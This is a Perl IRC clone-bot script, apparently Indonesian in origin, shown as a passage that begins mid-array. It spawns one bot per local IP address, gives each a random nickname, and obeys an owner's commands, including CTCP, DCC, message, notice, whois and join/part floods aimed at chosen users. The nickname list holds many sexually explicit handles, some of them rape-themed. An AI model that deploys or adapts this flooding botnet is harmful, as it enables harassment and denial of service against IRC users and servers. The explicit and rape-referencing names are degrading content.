"c3w_macan_imutz","c3w_matre","C3W_SWEETY","cew_Me2_CakeP","cew_19_JOMBLO","cew_17_JOMBLO","cew_18_JOMBLO","cew_20_JOMBLO","cew_21_JOMBLO'","cew_22_JOMBLO","cew_JOMBLO","cew_tanktop","cew_berdaster","cew_daster","cew_CANTIKX",
"cew_mu4niiIIeEezZZ","cew_kerenzzs","cew_phones3x","cew_show_CaM","cew_ajaib_ok","cew_aJaH_dEcH","cew_aJIP","cew_anggun","cew_apa_adanya","cew_army","cew_aSiK_aJaH","cew_asyik_girl","cew_ayu","cew_b4n9et","ce_baEk_cr","cE_BaEk_cuTeZ_fs",
"ce_bahenol","ce_barusan_jomblo","ce_bibir_mungil","ce_beautiful_girls","cew_beauty","cew_bebas_pa_ja","ce_benci_dunia","ce_bikin_gemes","ce_binal","Ce_Bispak_Gratis","ce_bRokEnheArt","ce_bsa_maen_musik","ce_bth_duit","ce_bugil",
"Ce_BuGil_SeNdiRian","Ce_Bule-cr-knln","ce_butuh_cairan","cE_ByRAn_nOw","cE_c4-NtIk_cUTe","cE_cAEm_yUhuu","ce_cakep-cr-pcr","Ce_cantikgirl","cE_cANtIqUe","ce_capi_fs","ce_cARi_cO_cAkEp","ce_cari_cowo_chns","ce_cari_doktermuda","ce_cari_pacar",
"Ce_CaRi_TemeN_BoBo","ce_chinese","ce_chn_hot","ce_chn_jomblo","Ce_Chnz_Lezz","Ce_Chnz_OK","ce_cimpoek","ce_cinderella","ce_cleopatra","CE_CLuBbYnG","Ce_cntiq_mau_PS","ce_cntix_kul","ce_cRi","ce_cute_n_cantiq","ce_dada_kecil","ce_dah_basah_neh",
"ce_dah_basah","ce_Devi","Ce_dijamin","ce_doyan_kehotel","Ce_dws_Maniz","ce_eviana","Ce_FiTa","ce_fitri","ce_full","ce_fun_dance_cluber","ce_ge_pngen","ce_happy","ce_keyrenz","ce_kos_dinodai","ce_kos_butuh","ce_kos_pengen","ce_kosan_bth",
"ce_kosan_sndiri","Ce_Lesbi","ce_lesby_horny","CE_LG_KSEPIAN","cE_LuOcU","cE_m0_Lepas_KepeRawanan","cE_ma0_mERasaKan_ML","ce_manda_maniez","Ce_Maniax_sek","ce_mauML","ce_marsha","ce_mo_dinodai_2x","Ce_MoNTok","ce_montox","ce_mungil",
"ce_mUpEng","ce_nWarzIZ_CR","ce_nafsu_gede","ce_nakal_bgtz","ce_ngebet","ce_nongkronk","cE_pLing_imUth","ce_pnggin","ce_puengen_bgt","ce_ratu_buaya","ce_sedang_cr_cinta","ce_seksi","ce_susu_montok","ce_swe3t_cr_co","cE_tuLen","cew-17-model",
"CeW_8u61L_HoT","cew_bth_kehangatan","cew_dhiajenk","cew_herrera","cew_hester","cew_heubert","cew_heyeck","cew_himmelfarb","cew_hind","cew_hirst","cew_hitchcock","cew_hoang","cew_hock","cew_dramatix","cew_ga_sk_fs","cEw_GiLa_hEpOtEsA",
"cew_horny_nie","Cew_jmbLo_sBy_imutzZ","cEW_LopHE_mUtZz","cew_modeling","Cewek_Suka_ga_pake","cew_nia","cew_sexyss","cew_lawless","cew_lecar","cew_lecce","cew_leclercq","cew_leite","cew_lenard","ce_sofia","cew_lesser","cew_lessi","cew_liakos",
"cew_lidano","cew_liem","ce_pelit","ce_politis","ce_rivera","ce_row","ce_royal","ce_ru","ce_sexton","ce_stock-terbatas","ce_sumer","ce_tuttle","ce_bikini_mulus","ce_bikini_model","ce_valencia","ce_vanZwet","ce_venne","cewex_white",
"ce_viana","ce_viens","ce_villarreal","cewex_cr_mrP","ce_vital","ce_viviani","ce_me2_imoet","cewex_nakal","ce_butuh_pisanggg","cewex_butuh_gituan","cewe_butuh_gituan","c3w_biasa_ja_YM","c3w_lg_YM","c3w_ol_YM","c3w_online_YM","c3w_ol_YM",
"c3w_online_YM","c3w_dJombLow","c3w_niezt","c3w_kerens","c3w_cantieks","c3w_setia-sedunia","c3w_sby_setia","c3w_mnizzzz_bgt","c3w_setia_cr_cow","c3w_super_setia","c3w_manis_fs","c3w_pengen_punya_cew","c3w_setia-bgt","c3w_jelek_setia",
"c3w_jelek-bgt","c3w_jlk_tp_setia","c3w_cr_serius","c3w_biasa_setia","c3w_setiaaaa","c3w_paling_maniz","c3w_setia_bgtttt","c3w_jojoba","c3w_jomblo_cr_cow","c3_perayu_cow","cew_perayu_cow","c3w_perayu_cow","cew_mulus_cantiq","c3_mulus_cantiq",
"cew_mulus_cantiq","c3w_mulus_cantiq","cew_mulus_butuhhh","c3_mulus_butuhhh","cew_mulus_butuhhh","c3w_mulus_butuhhh","cew_mw_dibayarr","cew_mw_dibayarr","c3_mw_dibayarr","c3w_mw_dibayarr","cew_butuh-bgt","c3_butuh-bgt","cew_butuh-bgt",
"c3w_butuh-bgt","cew_cr_pemuassss","c3_cr_pemuassss","cew_cr_pemuassss","c3w_cr_pemuassss","c3_cr_perjaka","cew_cr_perjaka","cew_cr_perjaka","c3w_cr_perjaka","c3w_","cew_minta_diperkosa","c3_minta_diperkosa","cew_minta_diperkosa",
"c3w_minta_diperkosa","c3w_","cew_ga-pake_CD","c3_ga-pake_CD","c3w_ga-pake_CD","c3w_","c3w_","c3w_","c3_ga-pake_bra","c3w_ga-pake_bra","cew_ga-pake_bra","cew_bra_pink","c3w_cd_pink","c3_cd_pink","c3_nungging","c3_kenikmatannn",
"c3_cr_gituann","c3_pengen_digituin","c3_butuhhh","c3w_ga_kuat","c3_panas_bgt","c3_lg_pengen","c3_lage_hot","c3_demen_gituan","c3_pemerkosa","c3_pengen_gituan","c3_mw_gituan","c3w_pengen_gituan","cew_sk_gituan","c3w_sk_bokep",
"c3w_bokep","c3w_bokepers","c3w_site_bokep","c3w_bayar_murah","c3w_suka_om2","c3w_butuh_pemuas","c3w_butuh_pemerkosa","c3w_cr_pemerkosa","c3w_betah_diperkosa","c3w_kuat_di-ranjang","c3w_kuat_bngt","c3w_mase_kuat","c3w_pelampiasan",
"c3w_cr_pelampiasan","c3w_pemerkosa_cow","c3w_pengen_nikmat","c3w_cr_nikmat","c3w_","c3w_jual_itu","c3w_di-jual","c3w_murahan","c3w_murahan-bgt","c3w_cr_palanggan","c3w_psk_asyik","c3w_jagir","c3w_jarak","c3w_kalimatan","c3w_cr_kenikmatan",
"c3w_pembawa_nikmat","c3w_pemerkosa","c3w_mw_dinaikin","c3w_lg_pengen","c3w_lg_dapet","c3w_nakal_pengen","cewex_nakal-bgt","cewex_cantik_nakal","cewex_mulus_binal","cewex_putih_mulus","cewex_pengen_dianu","cewex_anunya_mungil","cewex_itunya-kecil",
"cewex_ga_pake_cd","cewex_","c3w_cr_pemuassss","c3w_cr_pemerkosa","c3w_bikin_anak","cewex_kupu2malam","cewek_kupu2malam","cew_kupu2malam","c3w_kupu2malam","c3w_mw_di-anu","c3w_mw_diraba","c3w_mw_digituin","c3w_pengen_digituin","c3w_pengen_nikmat",
"c3w_kenikmatan_sesaat","c3w_cr_kenikmatan","c3w_cr_om2","c3w_mw_ama_om2","c3w_mw_dipesan","c3w_mw_dibayar","c3w_cr_gratisan","c3w_pengen_anu_cow","c3w_lg_pengen","c3w_pengen_dielus","c3w_itunya_merah","c3w_cr_kesenangan","c3w_mulus_cr_cow",
"c3w_mulus_bgt","c3w_putih_mulus","cew_cari_nikmat","c3w_cari_nikmat","c3w_cr_nikmat","cew_cr_nikmat","c3w_pngn_buang_virgin","cew_pngn_dihajar","c3w_meranjang","cew_meranjang","c3w_free4fun","cew_free4fun","c3w_penghibur_cow","cew_penghibur_cow",
"c3w_pngn_main_belakang","cew_pngn_main_belakang","c3w_pengen_nungging","cew_pengen_nungging","c3w_mw_main_kasar","cew_mw_main_kasar","cew_pngn_dinikmati","cew_penjinak_cow","cew_pengen_semalam","cew_main_isi_pulsa","cew_mw_diperkosa",
"cew_pngen_gituan","cew_cr_kesenangan","cew_pemuas_buaya","cew_pengen_jatah","cew_minta_jatah","cew_pengen_dipuasin","cew_mw_dipuasin","cew_pemuja_cow","cew_mw_gituan","cew_pengen_gituan","cew_sk_meranjang","cew_sk_ngemut","cew_sexy-bgt",
"cew_bokepers","cew_sk_burung","cew_pemuas","cew_butuh_cow","cew_rela_diperkosa","cew_pengen_di_isep","cew_ga_pakeCD","cew_telanjang","cew_maniax","cew_cutexx","cew_starone","cew_sakit","cew_semrawut","c3_korax","cew_sumringah","c3_kegelapan",
"c3w_pujangga","cew_emperor","cew_mutiara","c3w_ratu","c3w_srigala","c3w_jadi_jadian","cew_korek_api","cew_mulitan","c3w_dewaza","cew_cafein","c3w_kopi_maniz","c3w_kulus","c3w_dramatix","c3w_tragis","c3w_kenangan","c3w_berbunga2","c3_seal",
"c3w_modeling","c3w_sk_gelap","cew_nescafee","cew_cakep-bgt","cew_cantix_kul","cew_pemuassss","cew_cari_gituan","cew_cari_tugas","c3w_ceria","cew_17cute","c3w_cleopatra","cew_cntix_kul","cew_CR_CR","c3w_cr_hacker","cew_cr_web_desain",
"cew_cuanteeeeek","cew_cuet_cuet","cew_cute_cr_temen","cew_cutez","cew_desain","cew_dunia_maya","cew_Dwss_bgt","c3w_Fitri_FS","cew_fS_nARziEsss","cew_mo_gajian","cew_gembredek","cew_genit_bgt","cew_gi_anu_anu","cew_gi_sibuk","cew_hackers",
"cew_ideal","cew_ImoetzzzZ","cew_imoot","cew_imootez","cew_ImUtZzZz","cew_imyuth","cew_informatika","cew_jutek_bgt","cew_kerens_fs","cew_kerj_di_internet","cew_lg_kesepian","c3w_komputeris","c3w_korea","cew_kul_Cantix","cew_kuliah_ITS",
"cew_lebay_euy","cew_linux_user","cew_lynx","cew_maniees","cew_maniezt_girl","cew_mAnIiEezzZ_jOmBlO","c3_matre","cew_moesliem","cew_ngeblog","c3_nightmare","cew_nizzz","cew_nulis_web","cew_patah_ht","cew_penulis","cew_perompak","cew_pinter_banget",
"cew_pirate","cew_product","cew_punya_blog","cew_punya_web","c3w_punya_website","c3w_re2","cew_riZa_efEZt","c3w_SAKURA_nizz","cew_kebobolan","cew_site_modeling","cew_smart_plus_maniezz","cew_suka_anime","c3_SWEETY","cew_pinter_muasin",
"cewex_putih_mulus","cew_mulussss","cew_cri_perangsang","cew_pengen_gituannn","cew_smk_it","cew_Pemangsa_Sby","c3w_demen_gituan","cewex_anggun","c3w_sk_bikin_anak","c3w_bikini_bgt","c3w_engen_lontong","Cewex_crI_tMn_bAEk","c3w_CutE","c3w_dispro",
"c3w_informatika","c3w_jomblo_nizz","c3w_sk_bgt","c3w_anunya_mulus","c3w_cr_selingkuhan","c3w_teknik_industri","c3w_dias_fs","cewek_belajar_web","cewek_demen_naruto","cewek_hongkong","cewek_inisial_N","cewek_japan_anime","cewek_kerj_internet",
"cewek_koleksi_movie","cewek_lg_butuh_itu","cewek_olaraga_kelamiiin","cewek_pinter","cewek_itunya_mulus","cewex_itunya_putih","cewex_korea_cakep","cEwk_dJombLow","cewk_niezt","cew3k_t0mb0y","c3w_kerens","c3w_mursals","c3w_brandals","c3w_solo_lo",
"c3w_ria","c3w_cicak","c3w_spiderman","c3w_mulus_gi_pengen","c3w_buaya","c3w_kuliah_wk","c3w_kul_unesa","c3w_putih_nizz","c3w_gitaris","cew_sep_bgt","cew_mantapp","cew_mo_pingsan","cew_pengen_mati","cew_ngerjain_tugas","cew_seles_nokia","cew_lamru",
"c3w_jav_model","cew_av_model","cew_model_bokep","cew_model_jav","c3w_model_av","c3w_model_av","cew_maria_ozawa","cew_model_hot","c3w_hot_model","cew_model_mulus","cew_ajak_kencan","cew_kencan_semalam","cew_making_love","cew_pemijat","cew_pijat_nikmat",
"cew_tahan_lama","cew_kuat_digilir","cew_nakal_pengen","cew_cr_nikmattt","cew_cr_kesenangan","cew_cr_om2_genit","cew_eka_mulusss","cew_mupeng_berat","cew_mupeng_banget","cew_tetek_gedee","cew_nenen","c3_bokepers","cew_artis_bokep","cew_sk_bokep",
"cew_bintang_bokep","cew_sk_om2","cew_mau_ma_om2","cew_pengen_ma_om2","cew_jalan_ma_om2","cew_rok_mini","cew_rok_pendek","cew_rok_minim","cew_ga_pake_rok","cew_pake_stoking","cew_paha_mulus","cew_da2_mulus","cew_da2_gede","cew_da2_imut","cew_jual_itu",
"cew_jual_nikmat","c3w_jual_jasa","c3w_jalanan","c3w_bad","c3w_item_maniez","c3w_putih_maniez","c3w_kuning_maniez","c3w_item_mulus","c3w_kuning_mulus","c3w_berbulu","c3w_berbulu_pengen","c3w_lg_pengennnn","c3w_main_keras","c3w_maen_ganas","c3w_amature",
"c3w_hard-Core","c3w_mulus_jav","c3w_av-model","c3w_gunung_gede","c3w_gunung_mulus","c3w_lubang_buaya","c3w_kupu2-malam","c3w_paha_mulusss","c3w_selangkangan_gatal","c3w_korea_cr_cow","c3w_bertato","c3w_main_free","c3w_main_ps","c3w_pengen_ps",
"c3w_penyewaan_jasa","c3w_pembunuh_cow","c3w_buaya_laut","c3w_lubang_buaya","c3w_cr_buaya","c3w_DiTiduriBuaya","c3w_pemuas_lelaki","c3w_pemuas_cow","c3w_pemuas_buaya","c3w_pemuas_om2","c3w_pemuas_pejantan","c3w_cr-pejantan","c3w_mw_ama_pejantan",
"c3w_cr_mr-P","c3w_demen_mr-P","c3w_butuh_mr-P","c3w_sk_mr-P","c3w_ga_virgin","c3w_hilang_virgin","c3w_virgine_unlimited","c3w_emut_mr-P","c3w_perokok_coklat","c3w_tumbuh_rambut","c3w_tumbuh_gunung","c3w_tumbuh_itunya","c3w_mw_em-el","c3w_bs_hub-intim",
"c3w_mw-hub-intim","c3w_pengen_hub-intim","c3w_pengen_intim","c3w_horrneeey","c3w_gatal-itunya","c3w_pemerkosa_om2","c3w_pemerkosa_perjaka","c3w_pemerkosa_jejaka","c3w_pemerkosa_cow","c3w_lessby","c3w_lezzz","c3w_cantix_less","c3w_less_mulus","c3w_biseeeks",
"c3w_kuat_dikeroyok","c3w_pgen_dikeroyok","c3w_dikeroyok_cow","c3w_itunya-gede","c3w_itunya-gatal","c3w_itunya-imoet","c3w_itunya-mulus","c3w_model_japan","c3w_model_maniz","c3w_model_anime","c3w_haruna-sakura","c3w_model-miyabi","c3w_kalahin-miyabi",
"c3w_panas_pengen","c3w_pengen_hot","c3w_borack","c3w_ketagihan_cow","c3w_ketagihan_pisang","c3w_pengen_pisang","c3w_pake_bra_ketat","c3w_bispak-bgt","c3w_mw_nungging","c3w_stan_nungging","c3w_stan_dogi","c3w_boxer","c3w_stan_samping","c3w_pakar_bercinta",
"c3w_mahir_bercinta","c3w_pngen_bercinta","c3w_mw_bercinta","c3w_mau_bercinta","c3w_tante2","c3w_tante2-btuh","c3w_tante2_cr","c3w_tante2_pengen","c3w_tante2_cr_cow","c3w_free_ml","c3w_free_bokep","c3w_dugem_asyik","c3w_ratu_dugem","c3w_mw_dugem","c3w_pngen_dugem",
"c3w_lg_dugem","c3w_lg_mabok","c3w_cd_pink","c3w_cd_merah","c3w_cd_ijo","c3w_cd_putih","c3w_cd_transparan","c3w_cd_item","c3w_cd_biru","c3w_pemusnah_massal","c3w_pmusnah_cow","c3w_free_video","c3w_free_gituan","c3w_mw_gituan-free","c3w_pngen-cek-in","c3w_mw_cek-in",
"c3w_dadamulus","c3w_da2Mulus","c3w_bra_putih","c3w_poto_model","c3w_mw-date","c3w_dapice","c3w_tante_mira","c3w_tante_robi","c3w_tante_tati","c3w_tante_tutik","c3w_tutik","c3w_mira","c3w_vitaa","c3w_eny","c3w_iin","c3w_eka","c3w_sari","c3w_linda","c3w_pipit",
"c3w_santi","c3w_eva","c3w_fany","c3w_ely","c3w_melly","c3w_ester","c3w_putri","c3w_po3","c3w_ella","c3w_rosi","c3w_inem","c3w_tatik","c3w_sthevani","c3w_dicks","c3w_dinodai","c3w_ratih","c3w_ajenk","c3w_ajeng","c3w_diah","c3w_dyah","c3w_marsya","c3w_cantixx",
"c3w_cantika","c3w_anggi","c3w_angelina","c3w_indah","c3w_permata","c3w_dian","c3w_pamela","c3w_herlina","c3w_lina","c3w_nanda","c3w_ananda","c3w_adel","c3w_adult","c3w_adult_model","c3w_indo_adult","c3w_japan_adult","c3w_sby_adult","c3w_jakarta_adult","c3w_modeling_adult",
"cew_cina_cuantik","cew_ckp_bngt","cew_cr_ttm","cew_CuNi3z_Fs","cew_cut3","cew_CuTe_SmA","cew_cUtEz","cew_gokiiilllll_lucu","cew_less_mutz","cew_zkull_ztar_one","C3-CANTIK-ADUHAI","c3w3x_chn","c3_1c4gals","c3_b4w3l","c3_CHNZZZ_smg","c3_im03t_bratang",
"c3_j0m8L0","c3_jut3x","c3_macan_imutz","c3_matre","c3_SWEETY","c3w_Me2_CakeP","c3w_19_JOMBLO","c3w_17_JOMBLO","c3w_18_JOMBLO","c3w_20_JOMBLO","c3w_21_JOMBLO'","c3w_22_JOMBLO","c3w_JOMBLO","c3w_tanktop","c3w_berdaster","c3w_daster","c3w_CANTIKX",
"c3w_mu4niiIIeEezZZ","c3w_kerenzzs","c3w_phones3x","c3w_show_CaM","c3w_ajaib_ok","c3w_aJaH_dEcH","c3w_aJIP","c3w_anggun","c3w_apa_adanya","c3w_army","c3w_aSiK_aJaH","c3w_asyik_girl","c3w_ayu","c3w_b4n9et","cew_baEk_cr","cew_BaEk_cuTeZ_fs","cew_bahenol",
"cew_barusan_jomblo","cew_bibir_mungil","cew_beautiful_girls","c3w_beauty","c3w_bebas_pa_ja","cew_benci_dunia","cew_bikin_gemes","cew_binal","cew_Bispak_Gratis","cew_bRokEnheArt","cew_bsa_maen_musik","cew_bth_duit","cew_bugil","cew_BuGil_SeNdiRian","cew_Bule-cr-knln",
"cew_butuh_cairan","cew_ByRAn_nOw","cew_c4-NtIk_cUTe","cew_cAEm_yUhuu","cew_cakep-cr-pcr","cew_cantikgirl","cew_cANtIqUe","cew_capi_fs","cew_cARi_cO_cAkEp","cew_cari_cowo_chns","cew_cari_doktermuda","cew_cari_pacar","cew_CaRi_TemeN_BoBo","cew_chinese","cew_chn_hot",
"cew_chn_jomblo","cew_Chnz_Lezz","cew_Chnz_OK","cew_cimpoek","cew_cinderella","cew_cleopatra","cew_CLuBbYnG","cew_cntiq_mau_PS","cew_cntix_kul","cew_cRi","cew_cute_n_cantiq","cew_dada_kecil","cew_dah_basah_neh","cew_dah_basah","cew_Devi","cew_dijamin","cew_doyan_kehotel",
"cew_dws_Maniz","cew_eviana","cew_FiTa","cew_fitri","cew_full","cew_fun_dancew_cluber","cew_ge_pngen","cew_happy","cew_keyrenz","cew_kos_dinodai","cew_kos_butuh","cew_kos_pengen","cew_kosan_bth","cew_kosan_sndiri","cew_Lesbi","cew_lesby_horny","cew_LG_KSEPIAN","cew_LuOcU",
"cew_m0_Lepas_KepeRawanan","cew_ma0_mERasaKan_ML","cew_manda_maniez","cew_Maniax_sek","cew_mauML","cew_marsha","cew_mo_dinodai_2x","cew_MoNTok","cew_montox","cew_mungil","cew_mUpEng","cew_nWarzIZ_CR","cew_nafsu_gede","cew_nakal_bgtz","cew_ngebet","cew_nongkronk","cew_pLing_imUth",
"cew_pnggin","cew_puengen_bgt","cew_ratu_buaya","cew_sedang_cr_cinta","cew_seksi","cew_susu_montok","cew_swe3t_cr_co","cew_tuLen","cew-17-model","c3w_8u61L_HoT","c3w_bth_kehangatan","c3w_dhiajenk","c3w_herrera","c3w_hester","c3w_heubert","c3w_heyeck","c3w_himmelfarb","c3w_hind",
"c3w_hirst","c3w_hitchcock","c3w_hoang","c3w_hock","c3w_dramatix","c3w_ga_sk_fs","c3w_GiLa_hEpOtEsA","c3w_horny_nie","c3w_jmbLo_sBy_imutzZ","c3w_LopHE_mUtZz","c3w_modeling","Cewek_Suka_ga_pake","c3w_nia","c3w_sexyss","c3w_lawless","c3w_lecar","c3w_lecce","c3w_leclercq","c3w_leite",
"c3w_lenard","cew_sofia","c3w_lesser","c3w_lessi","c3w_liakos","c3w_lidano","c3w_liem","cew_pelit","cew_politis","cew_rivera","cew_row","cew_royal","cew_ru","cew_sexton","cew_stock-terbatas","cew_sumer","cew_tuttle","cew_bikini_mulus","cew_bikini_model","cew_valencia",
"cew_vanZwet","cew_venne","cewex_white","cew_viana","cew_viens","cew_villarreal","cew_vital","cew_viviani","cew_me2_imoet","cewex_nakal","cew_butuh_pisanggg","cewex_butuh_gituan");

my @realname  = ("14airmataNETWORK");
my @WHO;
my $qqum="*";
$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n+ airmataNETWORK\n";
 print "+ Aturan Pakai : perl $0 (server)\n";
 print "+ betulin dulu sekriptnya boss..\n\n";
 exit(1);
}
$SIG{CHLD} = sub { wait }; # alterando o signal
my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
@ips = (@ips1, @ips2, @fbsd);
open(ipzitcho,">ips.txt") || die "- ips.txt not found";
          print ipzitcho" @ips";
          close(ipzitcho);
@ips = grep { s/\n$// } @ips;
$0 =  $procname  . "\0";
$nick2 = $nick;
print STDOUT "\n+ user\n";
print STDOUT "+ Server : $server\n";
print STDOUT "+ Port   : $port\n";
print STDOUT "+ Owner  : $owner\n";
print STDOUT "+ Channel: $channel\n";
print STDOUT "+ IPs    : $qtip\n\n";
use IO::Socket;
foreach my $FROM (@ips) {
 my $pid = fork(); # gerando um novo processo
  unless ($pid) {   #
my $ident = $nickname[rand scalar @nickname];
my $nick = $nickname[rand scalar @nickname];
my $name = $realname[rand scalar @realname];
$sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
   print $sock "NICK ".$nick."\n";
    print $sock "USER $ident $FROM $server :$name\n";
while (<$sock>) {
        if (/^:.+?\s433\s/) { # nick already in use
            $nick2 = $nickname[rand scalar @nickname];
            print $sock "NICK ".$nick2."\n";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock "JOIN $channel\n";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock "PONG :$1\n";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.mbod (.*)/){
            print $sock "$1";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.help(.*)/){
            print $sock "PRIVMSG ".$owner." : ipays\n";
            print $sock "PRIVMSG ".$owner." : #maza\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .mbod join #chan\n";
            print $sock "PRIVMSG ".$owner." : .mbod part #chan\n";
            print $sock "PRIVMSG ".$owner." : .msg nick (nick)\n";
            print $sock "PRIVMSG ".$owner." : .quit\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .ctcpflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .dccflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .noticeflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .msgflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .hop #chan (pesan)\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.msg(.*)/){
                        print $sock "PRIVMSG ".$1." : ".$2."\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.who(.*)/){
                        print $sock "who ".$channel."\n";
      }
      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
                        my $nicks = $1;
                        #$nicks =~ s/\n//;
                        #$nicks =~ s/\r//;
                        push(@WHO, split(/ /, $nicks));
                        print STDOUT "$who[1]\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.dccflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.whoisflood(.*)/){
                        for (1 .. 5) {
                        print $sock "whois ".$1."\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.hop (.*)/){
                print $sock "JOIN ".$1." : ".$2."\n";
                        for (1 .. 5) {
                        print $sock "PART ".$1." : ".$2."\n";
                        print $sock "JOIN ".$1." : ".$2."\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.ctcpflood(.*)/){
                print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        print $sock "PRIVMSG ".$1." :\001PING\001\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.msgflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :4susumu cilikkkkkkkkk\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.noticeflood(.*)/){
                        for (1 .. 5) {
                        print $sock "NOTICE ".$1." :4susumu cilikkkkkkkkk\n";
                        }
      }
      if(/^ERROR :(.*)/){
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.quit(.*)/){
                        die();
      }
      if(/^\:.*: Connection timed out(.*)/){
                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.ssmaboyts(.*)/){
                        print $sock "PRIVMSG ".$owner." : Bot Ssmaboyts\n";
                        print $sock "PRIVMSG ".$owner." : Using server : $server\n";
                        print $sock "PRIVMSG ".$owner." : Using port   : $port\n";
                        print $sock "PRIVMSG ".$owner." : Using nick   : $nick\n";
                        print $sock "PRIVMSG ".$owner." : Using owner  : $owner\n";
                        print $sock "PRIVMSG ".$owner." : Using ident  : $id\n";
                        print $sock "PRIVMSG ".$owner." : putri-bot\n\n";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:.owner\s+(.*)/ ){
                       $owner =$1;
                       $owner =~ s/ //;
                       $owner =~ s/\r$//;
                       $owner =~ s/\n$//;
       }
   }
exit;
  } 
}
